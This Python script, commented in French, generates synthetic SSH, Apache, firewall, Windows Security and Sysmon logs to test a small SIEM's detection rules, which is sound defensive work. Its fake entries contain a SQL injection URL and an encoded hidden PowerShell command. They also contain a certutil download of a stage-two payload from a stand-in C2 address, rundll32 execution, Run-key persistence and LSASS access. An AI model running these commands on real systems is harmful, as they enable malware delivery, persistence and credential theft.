#!/usr/bin/env python3
"""Générateur de logs SYNTHÉTIQUES pour tester le mini-SIEM.

Ce script n'attaque rien : il écrit de fausses lignes de log dans des fichiers,
afin de fournir un jeu de données reproductible. Il produit cinq sources :
  - auth.log           (SSH / sudo)      : brute force, brute force réussi, escalade sudo
  - access.log         (Apache combined) : scan web + injection SQL
  - ufw.log            (pare-feu)        : scan de ports
  - windows_events.xml (journal Sécurité): brute force, persistance, journal effacé
  - sysmon_events.xml  (Sysmon)          : document piégé -> PowerShell -> C2 -> LSASS
Les deux journaux Windows sont aussi écrits au format binaire .evtx.
Chaque scénario est conçu pour déclencher une règle, plus du trafic normal.

Usage :
    python generate_logs.py --outdir samples
"""
from __future__ import annotations

import argparse
import base64
import random
from datetime import datetime, timedelta
from pathlib import Path
from xml.sax.saxutils import escape

from minisiem.evtx import write_evtx

MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
          "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

HOST = "web01"
NORMAL_USERS = ["alice", "bob", "carol"]
NORMAL_IPS = ["192.168.1.20", "192.168.1.21", "10.0.0.5"]
BASE = datetime(2026, 11, 8, 9, 0, 0)


def syslog_ts(dt: datetime) -> str:
    return f"{MONTHS[dt.month - 1]} {dt.day:2d} {dt:%H:%M:%S}"


def apache_ts(dt: datetime) -> str:
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0100")


# --------------------------------------------------------------------------
def gen_auth(rnd: random.Random) -> list[tuple[datetime, str]]:
    out: list[tuple[datetime, str]] = []

    def add(dt, msg): out.append((dt, f"{syslog_ts(dt)} {HOST} {msg}"))

    # Trafic normal
    t = BASE
    for _ in range(40):
        t += timedelta(seconds=rnd.randint(30, 400))
        u, ip = rnd.choice(NORMAL_USERS), rnd.choice(NORMAL_IPS)
        add(t, f"sshd[{rnd.randint(1000,9999)}]: Accepted password for {u} "
               f"from {ip} port {rnd.randint(40000,60000)} ssh2")
        if rnd.random() < 0.3:
            add(t + timedelta(seconds=5),
                f"sudo[{rnd.randint(1000,9999)}]:  {u} : TTY=pts/0 ; "
                f"PWD=/home/{u} ; USER=root ; COMMAND=/usr/bin/apt update")

    # Brute force SSH simple
    t = BASE + timedelta(minutes=35)
    for _ in range(25):
        t += timedelta(seconds=rnd.randint(2, 10))
        u = rnd.choice(["root", "admin", "test", "oracle", "ubuntu"])
        add(t, f"sshd[{rnd.randint(1000,9999)}]: Failed password for "
               f"{'invalid user ' if u in ('test','oracle') else ''}{u} "
               f"from 203.0.113.66 port {rnd.randint(40000,60000)} ssh2")

    # Brute force réussi
    t = BASE + timedelta(minutes=50)
    for _ in range(8):
        t += timedelta(seconds=rnd.randint(3, 12))
        add(t, f"sshd[{rnd.randint(1000,9999)}]: Failed password for admin "
               f"from 198.51.100.23 port {rnd.randint(40000,60000)} ssh2")
    t += timedelta(seconds=9)
    add(t, f"sshd[{rnd.randint(1000,9999)}]: Accepted password for admin "
           f"from 198.51.100.23 port {rnd.randint(40000,60000)} ssh2")

    # Escalade sudo
    t = BASE + timedelta(minutes=58)
    add(t, "sudo[4812]:  www-data : user NOT in sudoers ; TTY=pts/1 ; "
           "PWD=/var/www ; USER=root ; COMMAND=/bin/bash")

    # Contact discret depuis une IP connue comme C2 (203.0.113.200) : seulement
    # 3 échecs, SOUS le seuil de brute force -> aucune règle de volume ne se
    # déclenche, mais la CTI la repère car l'IP est déjà référencée.
    t = BASE + timedelta(minutes=62)
    for _ in range(3):
        t += timedelta(seconds=rnd.randint(20, 90))
        add(t, f"sshd[{rnd.randint(1000,9999)}]: Failed password for root "
               f"from 203.0.113.200 port {rnd.randint(40000,60000)} ssh2")
    return out


def gen_access(rnd: random.Random) -> list[tuple[datetime, str]]:
    out: list[tuple[datetime, str]] = []
    FF = ("Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0")

    def add(dt, ip, method, url, status, ua):
        size = rnd.randint(200, 4000)
        out.append((dt, f'{ip} - - [{apache_ts(dt)}] "{method} {url} HTTP/1.1" '
                        f'{status} {size} "-" "{ua}"'))

    # Trafic normal
    t = BASE
    pages = ["/", "/index.html", "/about", "/contact", "/css/site.css", "/img/logo.png"]
    for _ in range(50):
        t += timedelta(seconds=rnd.randint(20, 300))
        add(t, rnd.choice(NORMAL_IPS), "GET", rnd.choice(pages), 200, FF)

    # Scan web : rafale de 404 depuis 203.0.113.9 avec un user-agent sqlmap
    t = BASE + timedelta(minutes=40)
    targets = ["/.env", "/wp-admin/", "/admin", "/phpmyadmin/", "/.git/config",
               "/backup.zip", "/config.php.bak", "/server-status", "/.aws/credentials",
               "/api/v1/users", "/login.php", "/shell.php", "/xmlrpc.php"]
    for i in range(30):
        t += timedelta(seconds=rnd.randint(1, 3))
        url = rnd.choice(targets) + (f"?id={i}" if rnd.random() < 0.3 else "")
        add(t, "203.0.113.9", "GET", url, 404, "sqlmap/1.7.2#dev")

    # Injection SQL explicite
    t += timedelta(seconds=4)
    add(t, "203.0.113.9", "GET",
        "/product.php?id=1'%20UNION%20SELECT%20username,password%20FROM%20users--",
        500, "sqlmap/1.7.2#dev")
    return out


def gen_ufw(rnd: random.Random) -> list[tuple[datetime, str]]:
    out: list[tuple[datetime, str]] = []

    def add(dt, src, dpt, proto="TCP"):
        out.append((dt, f"{syslog_ts(dt)} {HOST} kernel: [UFW BLOCK] IN=eth0 OUT= "
                        f"SRC={src} DST=10.0.0.5 PROTO={proto} "
                        f"SPT={rnd.randint(40000,60000)} DPT={dpt}"))

    # Scan de ports : 198.51.100.77 touche 30 ports distincts en < 1 min
    t = BASE + timedelta(minutes=45)
    ports = rnd.sample(range(1, 1024), 30)
    for p in ports:
        t += timedelta(milliseconds=rnd.randint(200, 1500))
        add(t, "198.51.100.77", p)
    return out


def _evt(dt: datetime, eid: int, computer: str, data: dict) -> str:
    fields = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
    return (f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            f'<System><Provider Name="Microsoft-Windows-Security-Auditing"/>'
            f'<EventID>{eid}</EventID>'
            f'<TimeCreated SystemTime="{dt.strftime("%Y-%m-%dT%H:%M:%S")}Z"/>'
            f'<Computer>{computer}</Computer></System>'
            f'<EventData>{fields}</EventData></Event>')


def gen_evtx(rnd: random.Random) -> list[tuple[datetime, str]]:
    out: list[tuple[datetime, str]] = []
    DC = "DC01"
    day = datetime(2026, 11, 8)

    def add(dt, eid, data): out.append((dt, _evt(dt, eid, DC, data)))

    # Baseline : jdupont se connecte à ses heures habituelles (8h-11h)
    for hour in (8, 9, 10, 11):
        for _ in range(2):
            t = day.replace(hour=hour, minute=rnd.randint(0, 59), second=rnd.randint(0, 59))
            add(t, 4624, {"TargetUserName": "jdupont", "IpAddress": "192.168.1.30",
                          "LogonType": "2"})

    # Connexion à une heure inhabituelle (3h12) pour jdupont -> WIN_UNUSUAL_HOUR
    add(day.replace(hour=3, minute=12), 4624,
        {"TargetUserName": "jdupont", "IpAddress": "203.0.113.66", "LogonType": "10"})

    # Brute force RDP : 12 échecs depuis une IP -> WIN_BRUTEFORCE
    t = day.replace(hour=2, minute=0)
    for _ in range(12):
        t += timedelta(seconds=rnd.randint(3, 15))
        add(t, 4625, {"TargetUserName": rnd.choice(["administrateur", "admin", "sql"]),
                      "IpAddress": "203.0.113.66", "LogonType": "10"})

    # Brute force réussi : 6 échecs + 1 succès, même IP -> WIN_BRUTEFORCE_SUCCESS
    t = day.replace(hour=2, minute=20)
    for _ in range(6):
        t += timedelta(seconds=rnd.randint(4, 14))
        add(t, 4625, {"TargetUserName": "administrateur",
                      "IpAddress": "198.51.100.23", "LogonType": "3"})
    t += timedelta(seconds=10)
    add(t, 4624, {"TargetUserName": "administrateur",
                  "IpAddress": "198.51.100.23", "LogonType": "3"})

    # Persistance : compte créé puis ajouté aux Administrateurs
    t = day.replace(hour=2, minute=25)
    add(t, 4720, {"TargetUserName": "svc_backup", "SubjectUserName": "administrateur"})
    add(t + timedelta(seconds=20), 4732,
        {"TargetUserName": "Administrators", "MemberName": "svc_backup",
         "SubjectUserName": "administrateur"})

    # Anti-forensic : journal de sécurité effacé -> WIN_LOG_CLEARED
    add(day.replace(hour=2, minute=40), 1102, {"SubjectUserName": "administrateur"})
    return out


# --------------------------------------------------------------------------
# Sysmon : un poste de travail, une journée normale, puis une chaîne d'infection
SYSMON_GUID = "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
PC = "PC-COMPTA01.corp.local"
USER, ADMIN, SYSTEM = r"CORP\mmartin", r"CORP\it-admin", r"NT AUTHORITY\SYSTEM"
EXPLORER = r"C:\Windows\explorer.exe"
CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
OFFICE = r"C:\Program Files\Microsoft Office\root\Office16"
WINWORD, EXCEL, OUTLOOK = OFFICE + r"\WINWORD.EXE", OFFICE + r"\EXCEL.EXE", OFFICE + r"\OUTLOOK.EXE"
SYS32 = r"C:\Windows\System32"
POWERSHELL = SYS32 + r"\WindowsPowerShell\v1.0\powershell.exe"
CMD, CERTUTIL, RUNDLL32 = SYS32 + r"\cmd.exe", SYS32 + r"\certutil.exe", SYS32 + r"\rundll32.exe"
SVCHOST, TASKMGR, LSASS = SYS32 + r"\svchost.exe", SYS32 + r"\Taskmgr.exe", SYS32 + r"\lsass.exe"
SPLWOW = r"C:\Windows\splwow64.exe"
MSMPENG = r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe"
HKU = r"HKU\S-1-5-21-3623811015-3361044348-30300820-1104"
C2 = "203.0.113.200"   # même IP C2 que dans auth.log : la CTI fait le lien


def _sysmon(dt: datetime, eid: int, record: int, data: dict) -> str:
    fields = "".join(f'<Data Name="{k}">{escape(str(v), {chr(34): "&quot;"})}</Data>'
                     for k, v in data.items())
    return (f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            f'<System><Provider Name="Microsoft-Windows-Sysmon" Guid="{SYSMON_GUID}"/>'
            f'<EventID>{eid}</EventID>'
            f'<TimeCreated SystemTime="{dt:%Y-%m-%dT%H:%M:%S}.{dt.microsecond:06d}0Z"/>'
            f'<EventRecordID>{record}</EventRecordID>'
            f'<Channel>Microsoft-Windows-Sysmon/Operational</Channel>'
            f'<Computer>{PC}</Computer></System>'
            f'<EventData>{fields}</EventData></Event>')


def gen_sysmon(rnd: random.Random) -> list[tuple[datetime, str]]:
    raw: list[tuple[datetime, int, dict]] = []
    day = datetime(2026, 11, 8)
    pids: dict[str, int] = {}

    def pid(image: str) -> int:
        return pids.setdefault(image, rnd.randint(1000, 9999))

    def at(h, m, s=0):
        return day.replace(hour=h, minute=m, second=s,
                           microsecond=rnd.randint(0, 999) * 1000)

    def base(dt, image, user):
        return {"RuleName": "-", "UtcTime": f"{dt:%Y-%m-%d %H:%M:%S}.{dt.microsecond // 1000:03d}",
                "ProcessId": pid(image), "Image": image, "User": user}

    def proc(dt, image, cmdline, parent, user=USER, integrity="Medium"):
        d = base(dt, image, user)
        d.update({"CommandLine": cmdline, "CurrentDirectory": r"C:\Users\mmartin" + "\\",
                  "IntegrityLevel": integrity, "ParentProcessId": pid(parent),
                  "ParentImage": parent})
        raw.append((dt, 1, d))

    def net(dt, image, dst, port, host="", user=USER):
        d = base(dt, image, user)
        d.update({"Protocol": "tcp", "Initiated": "true", "SourceIp": "10.0.20.15",
                  "SourcePort": rnd.randint(49152, 65535), "DestinationIp": dst,
                  "DestinationHostname": host, "DestinationPort": port})
        raw.append((dt, 3, d))

    def access(dt, image, granted, user=USER):
        d = {"RuleName": "-", "UtcTime": base(dt, image, user)["UtcTime"],
             "SourceProcessId": pid(image), "SourceImage": image,
             "TargetProcessId": pid(LSASS), "TargetImage": LSASS,
             "GrantedAccess": granted, "SourceUser": user, "TargetUser": SYSTEM}
        raw.append((dt, 10, d))

    def file(dt, image, path, user=USER):
        d = base(dt, image, user)
        d["TargetFilename"] = path
        raw.append((dt, 11, d))

    def reg(dt, image, key, value, user=USER):
        d = base(dt, image, user)
        d.update({"EventType": "SetValue", "TargetObject": key, "Details": value})
        raw.append((dt, 13, d))

    def dns(dt, image, name, result, user=USER):
        d = base(dt, image, user)
        d.update({"QueryName": name, "QueryStatus": "0", "QueryResults": result})
        raw.append((dt, 22, d))

    # --- Journée normale : navigation, messagerie, bureautique, administration
    proc(at(8, 31, 5), CHROME, f'"{CHROME}"', EXPLORER)
    dns(at(8, 31, 9), CHROME, "intranet.example.com", "::ffff:192.0.2.10;")
    proc(at(8, 33, 40), OUTLOOK, f'"{OUTLOOK}"', EXPLORER)
    dns(at(8, 33, 44), OUTLOOK, "mail.example.org", "::ffff:192.0.2.25;")
    t = at(8, 35)
    for _ in range(12):
        t += timedelta(seconds=rnd.randint(300, 1500))
        image, dst = rnd.choice([(CHROME, "192.0.2.10"), (CHROME, "192.0.2.11"),
                                 (OUTLOOK, "192.0.2.25")])
        net(t, image, dst, 443)
    proc(at(9, 10, 12), WINWORD,
         f'"{WINWORD}" /n "C:\\Users\\mmartin\\Documents\\budget_2027.docx"', EXPLORER)
    proc(at(9, 52, 30), SPLWOW, f"{SPLWOW} 12288", WINWORD)          # impression
    proc(at(9, 40, 2), EXCEL,
         f'"{EXCEL}" "C:\\Users\\mmartin\\Documents\\rapprochement_bancaire.xlsx"', EXPLORER)
    reg(at(9, 40, 3), EXPLORER,
        HKU + r"\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.xlsx\MRUListEx",
        "Binary Data")
    proc(at(10, 0, 1), POWERSHELL,                                    # tâche planifiée légitime
         f"{POWERSHELL} -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\inventaire.ps1",
         SVCHOST, user=SYSTEM, integrity="System")
    proc(at(10, 15, 20), CERTUTIL,                                    # contrôle d'empreinte
         f"{CERTUTIL} -hashfile C:\\Users\\it-admin\\Downloads\\setup.msi SHA256",
         CMD, user=ADMIN, integrity="High")
    file(at(10, 48, 7), CHROME, r"C:\Users\mmartin\Downloads\releve_octobre.pdf")
    access(at(11, 2, 40), MSMPENG, "0x1410", user=SYSTEM)             # antivirus : filtré
    access(at(11, 20, 15), TASKMGR, "0x1000")                          # droits de lecture seuls

    # --- Chaîne d'infection : pièce jointe piégée -> macro -> PowerShell -> C2
    file(at(14, 2, 11), CHROME, r"C:\Users\mmartin\Downloads\facture_2026-118.docm")
    proc(at(14, 5, 10), WINWORD,
         f'"{WINWORD}" /n "C:\\Users\\mmartin\\Downloads\\facture_2026-118.docm"', EXPLORER)
    # Charge encodée FACTICE (données synthétiques) : décodée, elle ne fait que
    # décrire l'étape suivante, vers une IP de documentation (RFC 5737).
    script = ("# mini-SIEM : donnees synthetiques\n"
              f"Start-Process certutil.exe -ArgumentList '-urlcache -split -f "
              f"http://{C2}/stage2.txt %TEMP%\\upd.dll'")
    enc = base64.b64encode(script.encode("utf-16-le")).decode()
    proc(at(14, 5, 31), POWERSHELL, f"powershell.exe -nop -w hidden -enc {enc}", WINWORD)
    dns(at(14, 5, 48), POWERSHELL, "cdn-update.example.net", f"::ffff:{C2};")
    proc(at(14, 5, 49), CERTUTIL,
         f"certutil.exe -urlcache -split -f http://{C2}/stage2.txt "
         r"C:\Users\mmartin\AppData\Local\Temp\upd.dll", POWERSHELL)
    net(at(14, 5, 50), CERTUTIL, C2, 80)
    file(at(14, 5, 52), CERTUTIL, r"C:\Users\mmartin\AppData\Local\Temp\upd.dll")
    proc(at(14, 6, 5), RUNDLL32,
         r"rundll32.exe C:\Users\mmartin\AppData\Local\Temp\upd.dll,Start", POWERSHELL)
    t = at(14, 6, 7)
    for _ in range(5):                                                 # balise vers le C2
        net(t, RUNDLL32, C2, 443)
        t += timedelta(seconds=60 + rnd.randint(-3, 3))
    reg(at(14, 7, 30), RUNDLL32,
        HKU + r"\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpdate",
        r"rundll32.exe C:\Users\mmartin\AppData\Local\Temp\upd.dll,Start")
    access(at(14, 9, 12), RUNDLL32, "0x1010")                          # vol d'identifiants

    raw.sort(key=lambda x: x[0])
    return [(dt, _sysmon(dt, eid, 52000 + i, data)) for i, (dt, eid, data) in enumerate(raw)]


def main() -> int:
    p = argparse.ArgumentParser(description="Génère des logs synthétiques.")
    p.add_argument("--outdir", default="samples")
    p.add_argument("--seed", type=int, default=1)
    args = p.parse_args()

    rnd = random.Random(args.seed)
    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)

    for name, lines in [("auth.log", gen_auth(rnd)),
                        ("access.log", gen_access(rnd)),
                        ("ufw.log", gen_ufw(rnd))]:
        ordered = sorted(lines, key=lambda x: x[0])
        (outdir / name).write_text("\n".join(l for _, l in ordered) + "\n",
                                   encoding="utf-8")
        print(f"[+] {len(ordered):3d} lignes -> {outdir / name}")

    evtx = sorted(gen_evtx(rnd), key=lambda x: x[0])
    (outdir / "windows_events.xml").write_text(
        "\n".join(x for _, x in evtx) + "\n", encoding="utf-8")
    print(f"[+] {len(evtx):3d} événements -> {outdir / 'windows_events.xml'}")

    sysmon = gen_sysmon(rnd)
    (outdir / "sysmon_events.xml").write_text(
        "\n".join(x for _, x in sysmon) + "\n", encoding="utf-8")
    print(f"[+] {len(sysmon):3d} événements -> {outdir / 'sysmon_events.xml'}")

    # Les mêmes journaux Windows au format binaire natif (.evtx), tels que les produit
    # l'Observateur d'événements : le mini-SIEM les lit directement.
    for name, blocks in (("windows_events.evtx", evtx), ("sysmon_events.evtx", sysmon)):
        (outdir / name).write_bytes(write_evtx([x for _, x in blocks]))
        print(f"[+] {len(blocks):3d} événements -> {outdir / name} (binaire)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
